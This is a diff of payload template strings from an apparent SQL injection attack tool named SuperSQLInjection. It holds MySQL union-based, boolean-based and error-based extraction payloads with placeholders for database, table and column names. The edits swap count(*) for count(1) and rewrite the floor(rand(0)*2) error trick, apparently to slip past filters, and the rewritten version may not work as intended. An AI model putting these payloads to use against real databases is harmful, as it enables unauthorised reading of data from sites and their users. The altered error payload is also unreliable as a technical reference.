@@ -67,7 +67,7 @@ namespace SuperSQLInjection.payload
         public static String bool_data_value = "(select {column} from (select {columns} from `{dbname}`.`{table}` limit {index},1)tmp)";
 
         //union获取数据条数
-        public static String data_count = "(select count(*) from `{dbname}`.`{table}`)";
+        public static String data_count = "(select count(1) from `{dbname}`.`{table}`)";
 
         //bool判断数据条数
         public static String bool_datas_count = " " + data_count + ">={len}";
@@ -76,7 +76,7 @@ namespace SuperSQLInjection.payload
         public static String union_value = " 1=2 union all select {data}";
 
         //error方式
-        public static String error_value = " (select 1 from (select count(*),concat(({data}),floor(rand(0)*2))x from information_schema.tables group by x)a)";
+        public static String error_value = " (select 1 from (select count(1),concat(({data}),floor(rand(0) xor 1))x from information_schema.tables group by x)a)";
         
         public static String hex = "(select hex({data}))";
         public static String hex_value = "(select hex(convert(({data}) using UTF8)))";
